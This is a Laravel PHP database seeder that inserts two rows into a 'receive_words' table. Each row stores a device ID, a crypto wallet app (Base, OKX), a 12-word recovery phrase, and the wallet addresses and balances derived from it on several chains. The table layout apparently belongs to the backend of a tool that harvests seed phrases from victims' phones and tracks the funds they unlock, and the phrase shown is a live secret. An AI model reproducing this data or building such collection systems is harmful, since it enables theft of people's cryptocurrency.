<?php

namespace Database\Seeders;

use Illuminate\Database\Seeder;
use Illuminate\Support\Facades\DB;

class ReceiveWordSeeder extends Seeder
{
    /**
     * Run the database seeds.
     */
    public function run(): void
    {
        $data = [
            [
                'id' => 9,
                'device_id' => 1,
                'device_number' => '8f4710cae23caccb7f20d603f570167b',
                'app_name' => 'Base',
                'app_package' => 'org.toshi',
                'words' => 'session deer fatigue glimpse call run brain drastic inquiry amateur copper hill',
                'wallet_address_btc' => 'bc1pm9gfenuu2qqhjrsx37fflj936afklzkhnx5dc4tta6ujw22q092sgt7txk',
                'wallet_balance_btc' => '0.00000000',
                'wallet_address_eth' => '0xfce69673bb5b1325f1258b3fa98a1413197f233e',
                'wallet_balance_eth' => '0.00000000',
                'wallet_balance_eth_usdt' => '0.00000000',
                'wallet_address_bsc' => '0xfce69673bb5b1325f1258b3fa98a1413197f233e',
                'wallet_balance_bsc' => '0.00000000',
                'wallet_balance_bsc_usdt' => '0.00000000',
                'wallet_address_tron' => 'TJFdmxqJbBJUxUHQdjcgPFBnYvqPmvH4Pj',
                'wallet_address_sol' => '5MTmdH5EpWduQ9Dk2sd2JEYK2NEgyjLEQvw6dUbLGDwH',
                'wallet_balance_sol' => '0.000000',
                'wallet_address_ton' => 'UQCBkn6e0RYiP-2IhIPfIksKDaMU-WFTLtbhf2wTjKOpdjkg',
                'wallet_balance_ton' => '0.000000',
                'wallet_address_xrp' => 'rGNFD4Fxvuxu6HQuuRbNPHr6CG9ZPxvMUT',
                'wallet_balance_xrp' => null,
                'wallet_balance_tron' => '7.00000800',
                'wallet_balance_tron_usdt' => null,
                'created_at' => '2026-01-03 19:52:38',
                'updated_at' => '2026-01-04 22:00:53',
            ],
            [
                'id' => 10,
                'device_id' => 1,
                'device_number' => '8f4710cae23caccb7f20d603f570167b',
                'app_name' => 'OKX',
                'app_package' => 'com.okinc.okex.gp',
                'words' => 'session deer fatigue glimpse call run brain drastic inquiry amateur copper hill',
                'wallet_address_btc' => 'bc1pm9gfenuu2qqhjrsx37fflj936afklzkhnx5dc4tta6ujw22q092sgt7txk',
                'wallet_balance_btc' => '0.00000000',
                'wallet_address_eth' => '0xfce69673bb5b1325f1258b3fa98a1413197f233e',
                'wallet_balance_eth' => '0.00000000',
                'wallet_balance_eth_usdt' => '0.00000000',
                'wallet_address_bsc' => '0xfce69673bb5b1325f1258b3fa98a1413197f233e',
                'wallet_balance_bsc' => '0.00000000',
                'wallet_balance_bsc_usdt' => '0.00000000',
                'wallet_address_tron' => 'TJFdmxqJbBJUxUHQdjcgPFBnYvqPmvH4Pj',
                'wallet_address_sol' => '5MTmdH5EpWduQ9Dk2sd2JEYK2NEgyjLEQvw6dUbLGDwH',
                'wallet_balance_sol' => '0.000000',
                'wallet_address_ton' => 'UQCBkn6e0RYiP-2IhIPfIksKDaMU-WFTLtbhf2wTjKOpdjkg',
                'wallet_balance_ton' => '0.000000',
                'wallet_address_xrp' => 'rGNFD4Fxvuxu6HQuuRbNPHr6CG9ZPxvMUT',
                'wallet_balance_xrp' => null,
                'wallet_balance_tron' => '7.00000800',
                'wallet_balance_tron_usdt' => null,
                'created_at' => '2026-01-03 19:53:04',
                'updated_at' => '2026-01-04 22:00:34',
            ],
        ];

        foreach ($data as $row) {
            DB::table('receive_words')->insert($row);
        }
    }
}
